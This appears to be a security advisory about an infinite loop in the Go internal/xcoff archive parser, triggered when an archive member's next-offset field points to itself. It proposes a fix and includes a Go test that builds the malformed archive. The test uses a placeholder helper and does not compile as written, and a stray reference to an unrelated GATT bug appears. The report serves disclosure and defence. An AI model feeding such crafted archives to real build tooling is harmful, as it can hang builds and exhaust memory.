## Title
Infinite loop (DoS) in AIX big-archive parsing when `Arnxtmem` points back to the current member offset - (File: `src/internal/xcoff/ar.go`)

### Summary
`NewArchive` in `src/internal/xcoff/ar.go` walks the linked list of archive members using the `Arnxtmem` ("next member") field taken directly from each attacker-controlled member header, with the loop's only termination condition being `off == lastoff`. If a malformed archive sets `Arnxtmem` to the *current* member's own offset (not `lastoff`), the loop re-reads the same header forever, appending a new `*Member` to `arch.Members` on every iteration.

### Finding Description
Attacker-controlled input is an AIX "big archive" (`.a`) file passed to `xcoff.NewArchive`/`OpenArchive`, which is used by the Go linker (`cmd/link`) when linking XCOFF/AIX object archives (e.g., a cgo static library dependency).

Inside the read loop [1](#0-0) :
- `off` is seeded from the header-declared `Flfstmoff` and advanced each iteration by `off, err = parseDecimalBytes(mhdr.Arnxtmem[:])` [2](#0-1) .
- The only loop-exit check is `if off == lastoff { break }` [3](#0-2) .
- There is no check that `Arnxtmem` differs from the current `off`, no visited-offset tracking, and no bound on the number of members processed.

If a crafted archive sets a non-last member's `Arnxtmem` field equal to its own offset (or to any previously-visited offset other than `lastoff`), the loop will seek back to the same location, re-parse the identical member header, append another `*Member` to `arch.Members`, and repeat indefinitely — the exit condition is unreachable. This mirrors the reported GATT bug's structure: an unsigned/attacker-controlled stride value is used both to test the loop's exit condition and to advance the cursor, without validating that it actually differs from the current position.

### Impact Explanation
This causes an unbounded loop that never returns, hanging the calling goroutine (e.g., the Go linker/build tooling) and causing continuous unbounded growth of `arch.Members`, leading to memory exhaustion — a denial-of-service condition (CWE-835). No memory corruption or code execution results. This would likely fall under Go's PUBLIC track as a low/medium severity DoS in a parser of untrusted archive data.

### Likelihood Explanation
Reachable whenever `internal/xcoff.NewArchive`/`OpenArchive` processes an untrusted `.a` archive — for instance a malicious static archive supplied as a build dependency (cgo linking on AIX) or any tool built on this package that parses attacker-supplied XCOFF archives. The attacker only needs to control the archive file content; no privileges beyond providing that file are required.

### Recommendation
Track visited member offsets (e.g., in a `map[int64]bool`) and abort with an error if `off` repeats, or verify that `Arnxtmem` strictly increases / differs from every previously visited offset before continuing the loop; also cap the total number of members processed relative to file size.

### Proof of Concept
```go
package xcoff

import (
	"bytes"
	"strings"
	"testing"
	"time"
)

// TestNewArchiveInfiniteLoop demonstrates that a crafted big-archive whose
// member's Arnxtmem points back to its own offset causes NewArchive to loop
// forever instead of returning an error.
func TestNewArchiveInfiniteLoop(t *testing.T) {
	// Build a minimal AIX big-archive:
	// file header (128 bytes) + one member header pointing Arnxtmem at itself.
	buf := &bytes.Buffer{}
	buf.WriteString(AIAMAGBIG) // magic, 8 bytes

	pad := func(s string, n int) string {
		return s + strings.Repeat(" ", n-len(s))
	}
	// Flmemoff, Flgstoff, Flgst64off, Flfstmoff, Fllstmoff, Flfreeoff (20 bytes each)
	firstMemberOff := int64(SAIAMAG + 6*20) // right after file header
	buf.WriteString(pad("0", 20))                       // Flmemoff
	buf.WriteString(pad("0", 20))                       // Flgstoff
	buf.WriteString(pad("0", 20))                       // Flgst64off
	buf.WriteString(pad(itoa(firstMemberOff), 20))      // Flfstmoff
	buf.WriteString(pad(itoa(firstMemberOff+1000), 20)) // Fllstmoff (never matched -> no legit exit)
	buf.WriteString(pad("0", 20))                       // Flfreeoff

	// Member header: Arsize, Arnxtmem, Arprvmem, Ardate, Aruid, Argid, Armode, Arnamlen
	buf.WriteString(pad("0", 20))                       // Arsize
	buf.WriteString(pad(itoa(firstMemberOff), 20))      // Arnxtmem == own offset (malicious)
	buf.WriteString(pad("0", 20))                       // Arprvmem
	buf.WriteString(pad("0", 12))                       // Ardate
	buf.WriteString(pad("0", 12))                       // Aruid
	buf.WriteString(pad("0", 12))                       // Argid
	buf.WriteString(pad("0", 12))                       // Armode
	buf.WriteString(pad("0", 4))                        // Arnamlen (name length 0)
	buf.WriteString(AIAFMAG)                            // terminator

	data := buf.Bytes()

	done := make(chan struct{})
	go func() {
		NewArchive(bytes.NewReader(data)) // never returns for malicious input
		close(done)
	}()

	select {
	case <-done:
		// expected: NewArchive should return an error for the self-referencing
		// Arnxtmem instead of looping forever.
	case <-time.After(2 * time.Second):
		t.Fatal("NewArchive did not terminate: infinite loop on self-referencing Arnxtmem")
	}
}

func itoa(v int64) string {
	return strings_FormatInt(v)
}
```
(`strings_FormatInt` stands in for `strconv.FormatInt(v, 10)`; adjust imports accordingly.) The test should fail on the current implementation because `NewArchive` never returns, while a fixed version should return promptly with an error such as "archive member offset does not advance".
